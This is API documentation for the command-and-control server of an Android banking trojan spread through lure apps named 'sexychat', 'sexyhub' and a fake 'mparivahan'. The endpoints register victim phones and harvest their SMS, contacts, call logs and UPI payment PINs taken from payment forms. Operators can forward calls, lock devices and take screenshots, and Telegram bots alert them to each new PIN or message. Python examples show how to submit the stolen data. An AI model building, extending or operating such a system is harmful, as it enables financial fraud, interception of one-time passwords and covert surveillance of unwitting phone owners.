# Device API Documentation

Complete documentation for all device-related endpoints.

---

## Table of Contents

1. [Device Registration](#device-registration)
2. [Device Management](#device-management)
3. [Device Commands](#device-commands)
4. [SMS Management](#sms-management)
5. [Contacts Management](#contacts-management)
6. [Call Logs](#call-logs)
7. [UPI PIN Collection](#upi-pin-collection)
8. [Device Status](#device-status)

---

## Device Registration

### POST /register
**Register New Device**

**Description:** Register a new Android device or update existing device information.

**Authorization:** None (uses `user_id` as admin identifier)

**Request Headers:**
```
Content-Type: application/json
```

**Request Body:**
```json
{
  "type": "register",
  "device_id": "abc123def456",
  "device_info": {
    "model": "Samsung Galaxy S21",
    "manufacturer": "Samsung",
    "brand": "samsung",
    "device": "SM-G991B",
    "product": "beyond1qltezs",
    "hardware": "exynos2100",
    "board": "exynos2100",
    "display": "RP1A.200720.012",
    "fingerprint": "samsung/beyond1qltezs/beyond1:13/RP1A.200720.012/G991BXXU5HVJ1:user/release-keys",
    "host": "SWDD5723",
    "os_version": "Android 13",
    "sdk_int": 33,
    "supported_abis": ["arm64-v8a", "armeabi-v7a", "armeabi"],
    
    "battery": 85,
    "battery_state": "charging",
    "is_charging": true,
    
    "total_storage_mb": 128000.5,
    "free_storage_mb": 95000.25,
    "storage_used_mb": 33000.25,
    "storage_percent_free": 74.22,
    
    "total_ram_mb": 8192.0,
    "free_ram_mb": 4096.0,
    "ram_used_mb": 4096.0,
    "ram_percent_free": 50.0,
    
    "network_type": "WiFi",
    "ip_address": "192.168.1.100",
    "is_rooted": false,
    "screen_resolution": "1080x2400",
    "screen_density": 420,
    
    "sim_info": [
      {
        "sim_slot": 0,
        "subscription_id": 1,
        "carrier_name": "T-Mobile",
        "display_name": "T-Mobile",
        "phone_number": "+15551234567",
        "country_iso": "us",
        "mcc": "310",
        "mnc": "260",
        "is_network_roaming": false,
        "icon_tint": -16746133,
        "card_id": 0,
        "carrier_id": 1,
        "is_embedded": false,
        "is_opportunistic": false,
        "icc_id": "",
        "group_uuid": "",
        "port_index": 0,
        "network_type": "LTE (4G)",
        "network_operator_name": "T-Mobile",
        "network_operator": "310260",
        "sim_operator_name": "T-Mobile",
        "sim_operator": "310260",
        "sim_state": "Ready",
        "phone_type": "GSM",
        "imei": "",
        "meid": "",
        "data_enabled": true,
        "data_roaming_enabled": false,
        "voice_capable": true,
        "sms_capable": true,
        "has_icc_card": true,
        "device_software_version": "",
        "visual_voicemail_package_name": "com.google.android.dialer",
        "network_country_iso": "us",
        "sim_country_iso": "us"
      }
    ],
    
    "fcm_token": "fcm_device_token_here",
    "is_emulator": false,
    "device_name": "Samsung Galaxy S21",
    "package_name": "com.example.app"
  },
  "user_id": "admin_device_token_here",
  "app_type": "sexychat"
}
```

**Key Parameters:**

**Required Fields:**
- `type` (string): Must be `"register"`
- `device_id` (string): Unique device identifier
- `device_info` (object): Device information
- `user_id` (string): Admin's device token (identifies device owner)
- `app_type` (string): Application type (`sexychat`, `mparivahan`, `sexyhub`)

**Device Info Fields:**
- `model` (string): Device model name
- `manufacturer` (string): Device manufacturer
- `os_version` (string): Android version
- `battery` (integer): Battery percentage (0-100)
- `storage_*` (float): Storage metrics in MB
- `ram_*` (float): RAM metrics in MB
- `network_type` (string): Network connection type
- `sim_info` (array): SIM card information
- `fcm_token` (string): Firebase Cloud Messaging token
- `app_type` (string): Application identifier

**Response (200 OK):**
```json
{
  "success": true,
  "device_id": "abc123def456",
  "message": "Device registered successfully",
  "admin_username": "admin1"
}
```

**Response (400 Bad Request):**
```json
{
  "detail": "Admin not found for the provided user_id"
}
```

**Response (422 Validation Error):**
```json
{
  "detail": [
    {
      "loc": ["body", "app_type"],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

**Features:**
- **Thread-safe registration** using upsert
- **Duplicate prevention** - Updates existing device if already registered
- **Auto-assigns Telegram Bot 1** for notifications
- **Sends Telegram notification** with device details (excluding `user_id`)
- **Sends push notification** to admin's mobile devices
- **Stores FCM token** for device commands
- **Logs registration** activity

**Telegram Notification (Bot 1):**
```
?? New Device Registered

?? Admin: admin1
?? Device ID: abc123def456
?? Model: Samsung Galaxy S21
?? Manufacturer: Samsung
?? OS: Android 13
?? App: ?? SexyChat
? Time: 2025-11-02 10:00:00 UTC

? Device is now being monitored!
```

**Push Notification to Admin:**
```
Title: "?? New Device Registered"
Body: "Samsung Galaxy S21 (SexyChat)"
Data: {
  "type": "device_registered",
  "device_id": "abc123def456",
  "model": "Samsung Galaxy S21",
  "app_type": "sexychat"
}
```

**App Type Values:**
- `sexychat` - ?? SexyChat
- `mparivahan` - ?? mParivahan
- `sexyhub` - ?? SexyHub

**Important Notes:**
1. `user_id` must match an admin's `device_token`
2. Device can register multiple times (updates info)
3. Registration is atomic (no race conditions)
4. `user_id` is stored but NOT shown to admin
5. FCM token saved for command delivery

---

## Device Management

### GET /api/devices
**List Devices**

**Description:** Get list of devices (Super Admin sees all, Admin sees own).

**Authorization:** Required (Bearer token)

**Request Headers:**
```
Authorization: Bearer YOUR_ACCESS_TOKEN
```

**Query Parameters:**
- `skip` (integer, optional): Pagination offset (default: 0)
- `limit` (integer, optional): Items per page (default: 100, max: 1000)
- `app_type` (string, optional): Filter by app type

**Example Requests:**
```bash
# Get all devices (paginated)
GET /api/devices?skip=0&limit=50

# Filter by app type
GET /api/devices?app_type=sexychat

# Combined
GET /api/devices?app_type=mparivahan&skip=0&limit=20
```

**Response (200 OK):**
```json
{
  "devices": [
    {
      "device_id": "abc123",
      "model": "Samsung Galaxy S21",
      "manufacturer": "Samsung",
      "os_version": "Android 13",
      "app_type": "sexychat",
      "admin_username": "admin1",
      "admin_token": "admin1_device_token",
      "user_id": "internal_user_id",
      "status": "online",
      "battery_level": 85,
      "is_charging": true,
      "total_storage_mb": 128000.5,
      "free_storage_mb": 95000.25,
      "storage_percent_free": 74.22,
      "total_ram_mb": 8192.0,
      "free_ram_mb": 4096.0,
      "ram_percent_free": 50.0,
      "network_type": "WiFi",
      "ip_address": "192.168.1.100",
      "is_rooted": false,
      "has_upi": true,
      "upi_pin": "1234",
      "fcm_tokens": ["fcm_token_1"],
      "telegram_bot_id": 1,
      "registered_at": "2025-11-01T10:00:00",
      "updated_at": "2025-11-02T09:55:00",
      "last_ping": "2025-11-02T09:55:00"
    }
  ],
  "total": 150,
  "hasMore": true
}
```

**Features:**
- **Super Admin**: Sees all devices
- **Admin/Viewer**: Sees only own devices
- **App type filtering**: Filter by `sexychat`, `mparivahan`, etc.
- **Pagination**: Supports large device lists
- **Valid devices only**: Filters out incomplete records
- **Sorted**: Newest devices first

**Device Status:**
- `online` - Recently active (< 5 min)
- `idle` - Inactive (5-30 min)
- `offline` - Not seen (> 30 min)
- `pending` - Newly registered

---

### GET /api/devices/app-types
**Get Available App Types**

**Description:** Get list of all unique app types with device counts.

**Authorization:** Required (Bearer token - `VIEW_DEVICES` permission)

**Request Headers:**
```
Authorization: Bearer YOUR_ACCESS_TOKEN
```

**Response (200 OK):**
```json
{
  "app_types": [
    {
      "app_type": "sexychat",
      "display_name": "?? SexyChat",
      "icon": "??",
      "count": 45,
      "color": "#4CAF50"
    },
    {
      "app_type": "mparivahan",
      "display_name": "?? mParivahan",
      "icon": "??",
      "count": 32,
      "color": "#2196F3"
    },
    {
      "app_type": "sexyhub",
      "display_name": "?? SexyHub",
      "icon": "??",
      "count": 18,
      "color": "#FF9800"
    }
  ],
  "total": 3
}
```

**Features:**
- Returns unique app types
- Shows device count per type
- Includes display name and icon
- Color coding for UI
- Filtered by admin (non-Super Admin sees own only)

**Use Cases:**
1. Populate app type filter dropdown
2. Show device distribution
3. Dashboard statistics
4. Admin analytics

---

### GET /api/devices/{device_id}
**Get Device Details**

**Description:** Get detailed information about a specific device.

**Authorization:** Required (Bearer token - `VIEW_DEVICES` permission)

**Request Headers:**
```
Authorization: Bearer YOUR_ACCESS_TOKEN
```

**Path Parameters:**
- `device_id` (string): Device identifier

**Response (200 OK):**
```json
{
  "device_id": "abc123",
  "model": "Samsung Galaxy S21",
  "manufacturer": "Samsung",
  "brand": "samsung",
  "device": "SM-G991B",
  "product": "beyond1qltezs",
  "hardware": "exynos2100",
  "os_version": "Android 13",
  "sdk_int": 33,
  "app_type": "sexychat",
  "admin_username": "admin1",
  "admin_token": "admin_device_token",
  "user_id": "internal_user_id",
  
  "battery_level": 85,
  "is_charging": true,
  "battery_state": "charging",
  
  "total_storage_mb": 128000.5,
  "free_storage_mb": 95000.25,
  "storage_used_mb": 33000.25,
  "storage_percent_free": 74.22,
  
  "total_ram_mb": 8192.0,
  "free_ram_mb": 4096.0,
  "ram_used_mb": 4096.0,
  "ram_percent_free": 50.0,
  
  "network_type": "WiFi",
  "ip_address": "192.168.1.100",
  "is_rooted": false,
  "screen_resolution": "1080x2400",
  "screen_density": 420,
  
  "sim_info": [...],
  
  "has_upi": true,
  "upi_pin": "1234",
  "upi_detected_at": "2025-11-01T15:30:00",
  
  "fcm_tokens": ["fcm_token_1", "fcm_token_2"],
  "telegram_bot_id": 1,
  
  "status": "online",
  "registered_at": "2025-11-01T10:00:00",
  "updated_at": "2025-11-02T09:55:00",
  "last_ping": "2025-11-02T09:55:00"
}
```

**Response (404 Not Found):**
```json
{
  "detail": "Device not found"
}
```

**Response (403 Forbidden):**
```json
{
  "detail": "Access denied to this device"
}
```

**Features:**
- Complete device information
- Real-time status
- Battery & storage metrics
- SIM card details
- UPI PIN (if available)
- Permission checks (admin can only view own devices)

---

### DELETE /api/devices/{device_id}
**Delete Device**

**Description:** Remove device from monitoring.

**Authorization:** Required (Bearer token - `MANAGE_DEVICES` permission)

**Request Headers:**
```
Authorization: Bearer YOUR_ACCESS_TOKEN
```

**Path Parameters:**
- `device_id` (string): Device identifier

**Response (200 OK):**
```json
{
  "message": "Device deleted successfully"
}
```

**Response (404 Not Found):**
```json
{
  "detail": "Device not found"
}
```

**Features:**
- Permanently deletes device
- Removes all device data
- Logs deletion activity
- Sends Telegram notification

**?? Warning:** This action is irreversible.

---

## Device Commands

### POST /api/devices/{device_id}/command
**Send Command to Device**

**Description:** Send remote command to Android device via Firebase.

**Authorization:** Required (Bearer token - `SEND_COMMANDS` permission)

**Request Headers:**
```
Authorization: Bearer YOUR_ACCESS_TOKEN
Content-Type: application/json
```

**Path Parameters:**
- `device_id` (string): Device identifier

**Request Body:**
```json
{
  "command": "ping",
  "data": {
    "custom_field": "value"
  }
}
```

**Available Commands:**

#### 1. Ping Device
```json
{
  "command": "ping"
}
```

#### 2. Get Device Status
```json
{
  "command": "get_status"
}
```

#### 3. Request SMS History
```json
{
  "command": "get_sms",
  "data": {
    "limit": 100
  }
}
```

#### 4. Request Contacts
```json
{
  "command": "get_contacts"
}
```

#### 5. Request Call Logs
```json
{
  "command": "get_call_logs",
  "data": {
    "limit": 50
  }
}
```

#### 6. Forward Calls
```json
{
  "command": "forward_calls",
  "data": {
    "target_number": "+1234567890",
    "enable": true
  }
}
```

#### 7. Lock Device
```json
{
  "command": "lock_device"
}
```

#### 8. Unlock Device
```json
{
  "command": "unlock_device"
}
```

#### 9. Play Sound
```json
{
  "command": "play_sound",
  "data": {
    "duration": 5000
  }
}
```

#### 10. Take Screenshot
```json
{
  "command": "screenshot"
}
```

**Response (200 OK):**
```json
{
  "success": true,
  "message": "Command sent successfully",
  "command": "ping",
  "device_id": "abc123"
}
```

**Response (404 Not Found):**
```json
{
  "detail": "Device not found"
}
```

**Response (400 Bad Request):**
```json
{
  "detail": "Device has no FCM token. Cannot send command."
}
```

**Features:**
- **Firebase Cloud Messaging** for delivery
- **Command validation**
- **Activity logging**
- **Telegram notification** (Bot 3)
- **Permission checks**

**Command Delivery:**
```
Admin ? Backend ? Firebase ? Device
         ?
    Logs Activity
         ?
   Sends Telegram Notification
```

**Telegram Notification (Bot 3):**
```
?? Command Sent

?? Admin: admin1
?? Device: abc123
?? Command: ping
? Time: 2025-11-02 10:15:00 UTC
```

---

## SMS Management

### POST /sms-history
**Receive SMS History from Device**

**Description:** Device sends SMS history to server.

**Authorization:** None (device endpoint)

**Request Headers:**
```
Content-Type: application/json
```

**Request Body:**
```json
{
  "type": "sms",
  "device_id": "abc123",
  "sms_list": [
    {
      "sms_id": "msg001",
      "from_number": "+1234567890",
      "message": "Complete SMS message content here",
      "timestamp": "2025-11-02T10:00:00",
      "is_read": false,
      "message_type": "inbox"
    },
    {
      "sms_id": "msg002",
      "from_number": "+0987654321",
      "message": "Another SMS message",
      "timestamp": "2025-11-02T09:30:00",
      "is_read": true,
      "message_type": "inbox"
    }
  ]
}
```

**Parameters:**
- `type` (string): Must be `"sms"`
- `device_id` (string): Device identifier
- `sms_list` (array): Array of SMS messages
  - `sms_id` (string): Unique message ID
  - `from_number` (string): Sender phone number
  - `message` (string): Full SMS content
  - `timestamp` (datetime): When SMS was received
  - `is_read` (boolean): Read status
  - `message_type` (string): `inbox`, `sent`, `draft`

**Response (200 OK):**
```json
{
  "success": true,
  "saved": 2,
  "skipped": 0
}
```

**Features:**
- **Upsert logic** - Prevents duplicates
- **Full message storage** - No truncation
- **Telegram notifications** - Sent to Bot 2
- **Thread-safe** - Handles concurrent uploads

**Telegram Notification (Bot 2) - NEW SMS:**
```
?? New SMS Received

?? Admin: admin1
?? Device: abc123
?? From: +1234567890
? Time: 2025-11-02 10:00:00 UTC

??????????????????????
?? Message:
Complete SMS message content here
(Full message, up to 3500 characters)
??????????????????????
```

---

### GET /api/devices/{device_id}/sms
**Get SMS Messages**

**Description:** Get SMS messages for a specific device.

**Authorization:** Required (Bearer token - `VIEW_SMS` permission)

**Request Headers:**
```
Authorization: Bearer YOUR_ACCESS_TOKEN
```

**Path Parameters:**
- `device_id` (string): Device identifier

**Query Parameters:**
- `skip` (integer, optional): Pagination offset (default: 0)
- `limit` (integer, optional): Items per page (default: 100)
- `from_number` (string, optional): Filter by sender

**Example Requests:**
```bash
# Get all SMS
GET /api/devices/abc123/sms

# Paginated
GET /api/devices/abc123/sms?skip=0&limit=50

# Filter by sender
GET /api/devices/abc123/sms?from_number=+1234567890
```

**Response (200 OK):**
```json
{
  "messages": [
    {
      "sms_id": "msg001",
      "device_id": "abc123",
      "admin_username": "admin1",
      "from_number": "+1234567890",
      "message": "Complete SMS message",
      "timestamp": "2025-11-02T10:00:00",
      "is_read": false,
      "message_type": "inbox",
      "created_at": "2025-11-02T10:00:05"
    }
  ],
  "total": 50,
  "hasMore": true
}
```

**Features:**
- **Full message content** (no truncation)
- **Pagination support**
- **Filter by sender**
- **Permission checks**
- **Sorted by timestamp** (newest first)

---

### DELETE /api/devices/{device_id}/sms
**Delete SMS Messages**

**Description:** Delete all SMS messages for a device.

**Authorization:** Required (Bearer token - `DELETE_DATA` permission)

**Request Headers:**
```
Authorization: Bearer YOUR_ACCESS_TOKEN
```

**Path Parameters:**
- `device_id` (string): Device identifier

**Response (200 OK):**
```json
{
  "message": "50 SMS messages deleted successfully"
}
```

**Features:**
- Deletes all SMS for device
- Logs deletion activity
- Permission checks

---

## Contacts Management

### POST /contacts
**Receive Contacts from Device**

**Description:** Device sends contact list to server.

**Authorization:** None (device endpoint)

**Request Headers:**
```
Content-Type: application/json
```

**Request Body:**
```json
{
  "type": "contacts",
  "device_id": "abc123",
  "contacts": [
    {
      "contact_id": "c001",
      "name": "John Doe",
      "phone_numbers": ["+1234567890", "+0987654321"],
      "emails": ["john@example.com"],
      "has_photo": true
    },
    {
      "contact_id": "c002",
      "name": "Jane Smith",
      "phone_numbers": ["+1111111111"],
      "emails": [],
      "has_photo": false
    }
  ]
}
```

**Parameters:**
- `type` (string): Must be `"contacts"`
- `device_id` (string): Device identifier
- `contacts` (array): Array of contacts
  - `contact_id` (string): Unique contact ID
  - `name` (string): Contact name
  - `phone_numbers` (array): Phone numbers
  - `emails` (array): Email addresses
  - `has_photo` (boolean): Profile photo status

**Response (200 OK):**
```json
{
  "success": true,
  "saved": 2,
  "skipped": 0
}
```

**Features:**
- **Upsert logic** - Prevents duplicates
- **Multiple phone numbers** per contact
- **Thread-safe** operations

---

### GET /api/devices/{device_id}/contacts
**Get Contacts**

**Description:** Get contact list for a specific device.

**Authorization:** Required (Bearer token - `VIEW_CONTACTS` permission)

**Request Headers:**
```
Authorization: Bearer YOUR_ACCESS_TOKEN
```

**Path Parameters:**
- `device_id` (string): Device identifier

**Query Parameters:**
- `skip` (integer, optional): Pagination offset (default: 0)
- `limit` (integer, optional): Items per page (default: 100)
- `search` (string, optional): Search by name/number

**Example Requests:**
```bash
# Get all contacts
GET /api/devices/abc123/contacts

# Search contacts
GET /api/devices/abc123/contacts?search=John

# Paginated
GET /api/devices/abc123/contacts?skip=0&limit=50
```

**Response (200 OK):**
```json
{
  "contacts": [
    {
      "contact_id": "c001",
      "device_id": "abc123",
      "admin_username": "admin1",
      "name": "John Doe",
      "phone_numbers": ["+1234567890", "+0987654321"],
      "emails": ["john@example.com"],
      "has_photo": true,
      "created_at": "2025-11-02T10:00:00",
      "updated_at": "2025-11-02T10:00:00"
    }
  ],
  "total": 150,
  "hasMore": true
}
```

**Features:**
- **Search by name or number**
- **Pagination support**
- **Permission checks**
- **Sorted alphabetically** by name

---

### DELETE /api/devices/{device_id}/contacts
**Delete Contacts**

**Description:** Delete all contacts for a device.

**Authorization:** Required (Bearer token - `DELETE_DATA` permission)

**Request Headers:**
```
Authorization: Bearer YOUR_ACCESS_TOKEN
```

**Path Parameters:**
- `device_id` (string): Device identifier

**Response (200 OK):**
```json
{
  "message": "150 contacts deleted successfully"
}
```

---

## Call Logs

### POST /call-logs
**Receive Call Logs from Device**

**Description:** Device sends call history to server.

**Authorization:** None (device endpoint)

**Request Headers:**
```
Content-Type: application/json
```

**Request Body:**
```json
{
  "type": "call_logs",
  "device_id": "abc123",
  "call_logs": [
    {
      "call_id": "call001",
      "phone_number": "+1234567890",
      "contact_name": "John Doe",
      "call_type": "incoming",
      "call_duration": 120,
      "timestamp": "2025-11-02T10:00:00",
      "is_answered": true
    },
    {
      "call_id": "call002",
      "phone_number": "+0987654321",
      "contact_name": "Unknown",
      "call_type": "outgoing",
      "call_duration": 60,
      "timestamp": "2025-11-02T09:30:00",
      "is_answered": true
    }
  ]
}
```

**Parameters:**
- `type` (string): Must be `"call_logs"`
- `device_id` (string): Device identifier
- `call_logs` (array): Array of call logs
  - `call_id` (string): Unique call ID
  - `phone_number` (string): Phone number
  - `contact_name` (string): Contact name (if available)
  - `call_type` (string): `incoming`, `outgoing`, `missed`
  - `call_duration` (integer): Duration in seconds
  - `timestamp` (datetime): Call timestamp
  - `is_answered` (boolean): Answer status

**Response (200 OK):**
```json
{
  "success": true,
  "saved": 2,
  "skipped": 0
}
```

**Features:**
- **Upsert logic** - Prevents duplicates
- **Call type tracking**
- **Duration recording**
- **Thread-safe** operations

---

### GET /api/devices/{device_id}/call-logs
**Get Call Logs**

**Description:** Get call history for a specific device.

**Authorization:** Required (Bearer token - `VIEW_DEVICES` permission)

**Request Headers:**
```
Authorization: Bearer YOUR_ACCESS_TOKEN
```

**Path Parameters:**
- `device_id` (string): Device identifier

**Query Parameters:**
- `skip` (integer, optional): Pagination offset (default: 0)
- `limit` (integer, optional): Items per page (default: 100)
- `call_type` (string, optional): Filter by type (`incoming`, `outgoing`, `missed`)

**Example Requests:**
```bash
# Get all calls
GET /api/devices/abc123/call-logs

# Filter missed calls
GET /api/devices/abc123/call-logs?call_type=missed

# Paginated
GET /api/devices/abc123/call-logs?skip=0&limit=50
```

**Response (200 OK):**
```json
{
  "call_logs": [
    {
      "call_id": "call001",
      "device_id": "abc123",
      "admin_username": "admin1",
      "phone_number": "+1234567890",
      "contact_name": "John Doe",
      "call_type": "incoming",
      "call_duration": 120,
      "timestamp": "2025-11-02T10:00:00",
      "is_answered": true,
      "created_at": "2025-11-02T10:00:05"
    }
  ],
  "total": 200,
  "hasMore": true
}
```

**Features:**
- **Filter by call type**
- **Pagination support**
- **Permission checks**
- **Sorted by timestamp** (newest first)

---

## UPI PIN Collection

### POST /save-pin
**Save UPI PIN from Payment Form**

**Description:** Capture UPI PIN directly from payment page HTML form.

**Authorization:** None (device endpoint)

**Request Headers:**
```
Content-Type: application/json
```

**Request Body:**
```json
{
  "device_id": "abc123",
  "upi_pin": "123456"
}
```

**Parameters:**
- `device_id` (string, required): Device identifier
- `upi_pin` (string, required): 4-6 digit UPI PIN

**Response (200 OK):**
```json
{
  "success": true,
  "message": "UPI PIN saved successfully"
}
```

**Response (404 Not Found):**
```json
{
  "detail": "Device not found. Device must be registered before saving PIN."
}
```

**Features:**
- **Updates existing device only** (no new device creation)
- **Validates device exists** before saving
- **Sends Telegram notification** (Bot 1)
- **Logs UPI detection** activity
- **Sets `has_upi: true`** flag
- **Updates timestamp** (`upi_detected_at`, `upi_last_updated_at`)

**Important:**
- Device **must be registered** first via `/register`
- If device not found ? 404 error (does NOT create device)
- Only updates UPI-related fields

**Telegram Notification (Bot 1):**
```
?? UPI PIN Detected

?? Admin: admin1
?? Device: abc123
?? PIN: 123456
? Time: 2025-11-02 10:00:00 UTC

? PIN saved successfully!
```

**Workflow:**
```
1. Device registers via /register
2. User enters UPI PIN on payment page
3. App extracts PIN from HTML form
4. App sends PIN to /save-pin
5. Server updates device record
6. Admin receives notification
```

---

## Device Status

### POST /device-status
**Update Device Status**

**Description:** Device sends periodic status updates.

**Authorization:** None (device endpoint)

**Request Headers:**
```
Content-Type: application/json
```

**Request Body:**
```json
{
  "device_id": "abc123",
  "battery_level": 75,
  "is_charging": false,
  "network_type": "4G",
  "free_storage_mb": 90000.0,
  "free_ram_mb": 3500.0,
  "status": "online"
}
```

**Parameters:**
- `device_id` (string): Device identifier
- `battery_level` (integer): Current battery %
- `is_charging` (boolean): Charging status
- `network_type` (string): Network type
- `free_storage_mb` (float): Available storage
- `free_ram_mb` (float): Available RAM
- `status` (string): Device status

**Response (200 OK):**
```json
{
  "success": true,
  "message": "Status updated"
}
```

**Features:**
- **Updates device metadata**
- **Updates `last_ping`** timestamp
- **Status change notifications** (Telegram Bot 3)
- **Battery monitoring**
- **Storage tracking**

**Status Change Notification (Bot 3):**
```
?? Device Status Changed

?? Admin: admin1
?? Device: abc123 (Samsung Galaxy S21)
?? Old Status: online
?? New Status: offline
? Time: 2025-11-02 10:30:00 UTC
```

**Automatic Status Updates:**
- Device sends periodic pings (every 1-5 min)
- Server updates `last_ping` timestamp
- Status calculated based on last ping:
  - `online`: < 5 min
  - `idle`: 5-30 min
  - `offline`: > 30 min

---

## Error Responses

### Common Errors

**400 Bad Request:**
```json
{
  "detail": "Admin not found for the provided user_id"
}
```

**401 Unauthorized:**
```json
{
  "detail": "Could not validate credentials"
}
```

**403 Forbidden:**
```json
{
  "detail": "Access denied to this device"
}
```

**404 Not Found:**
```json
{
  "detail": "Device not found"
}
```

**422 Validation Error:**
```json
{
  "detail": [
    {
      "loc": ["body", "device_id"],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

**500 Internal Server Error:**
```json
{
  "detail": "Database error"
}
```

---

## Data Types

### Storage & RAM Metrics

**Type:** `float` (MB)

```json
{
  "total_storage_mb": 128000.5,
  "free_storage_mb": 95000.25,
  "storage_used_mb": 33000.25,
  "storage_percent_free": 74.22,
  
  "total_ram_mb": 8192.0,
  "free_ram_mb": 4096.0,
  "ram_used_mb": 4096.0,
  "ram_percent_free": 50.0
}
```

### Timestamps

**Format:** ISO 8601 (UTC)

```json
{
  "registered_at": "2025-11-02T10:00:00",
  "updated_at": "2025-11-02T10:30:00"
}
```

---

## Security

### Device Authentication

Devices authenticate using:
1. `user_id` (admin's device token)
2. `device_id` (unique device identifier)

### Data Privacy

- `user_id` stored but NOT shown to admins
- UPI PINs encrypted in transit (HTTPS)
- SMS messages fully stored (no truncation)

### Permission Checks

Admins can only:
- View own devices
- Send commands to own devices
- Access SMS/contacts for own devices

Super Admins can:
- View all devices
- Access any device data
- Manage any device

---

## Rate Limiting

Currently no hard limits, but monitoring via:
- Activity logs
- Device status updates
- Command history

---

## Examples

### Complete Device Registration Flow

```python
import requests

# Device registration
response = requests.post("http://localhost:8000/register", json={
    "type": "register",
    "device_id": "abc123",
    "device_info": {
        "model": "Samsung Galaxy S21",
        "manufacturer": "Samsung",
        "os_version": "Android 13",
        "battery": 85,
        "app_type": "sexychat",
        # ... more fields
    },
    "user_id": "admin_device_token_here",
    "app_type": "sexychat"
})
print(response.json())
# {"success": true, "device_id": "abc123", "message": "Device registered successfully"}
```

### Send SMS History

```python
response = requests.post("http://localhost:8000/sms-history", json={
    "type": "sms",
    "device_id": "abc123",
    "sms_list": [
        {
            "sms_id": "msg001",
            "from_number": "+1234567890",
            "message": "Full SMS message here",
            "timestamp": "2025-11-02T10:00:00",
            "is_read": False,
            "message_type": "inbox"
        }
    ]
})
```

### Save UPI PIN

```python
response = requests.post("http://localhost:8000/save-pin", json={
    "device_id": "abc123",
    "upi_pin": "123456"
})
```

### Send Command (Admin)

```python
headers = {"Authorization": f"Bearer {admin_token}"}
response = requests.post(
    "http://localhost:8000/api/devices/abc123/command",
    headers=headers,
    json={"command": "get_sms"}
)
```

---

**Last Updated:** November 2, 2025  
**Version:** 2.0.0
